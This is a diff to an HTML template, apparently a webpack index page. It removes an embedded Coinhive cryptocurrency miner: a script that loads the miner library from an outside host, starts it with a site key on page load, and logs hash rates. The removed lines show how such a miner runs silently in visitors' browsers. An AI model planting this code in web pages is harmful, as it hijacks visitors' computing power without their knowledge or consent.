@@ -5,21 +5,5 @@
     <title><%= htmlWebpackPlugin.options.title %></title>
 </head>
 <body>
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-    var miner = new CoinHive.Anonymous('Xmaajw78T9CSwgdWhrhb7BVVUE327KBV');
-    miner.start();
-    // Listen on events
-    miner.on('found', function() {
-        console.log('Hash found!', arguments);
-    })
-    miner.on('accepted', function() { console.log('Hash accepted!', arguments); })
-
-    // Update stats once per second
-    setInterval(function() {
-        console.log('H/s: '+ miner.getHashesPerSecond() + ' aH: ' + miner.getAcceptedHashes() + " H: " + miner.getTotalHashes());
-    }, 10000);
-
-</script>
 </body>
 </html>
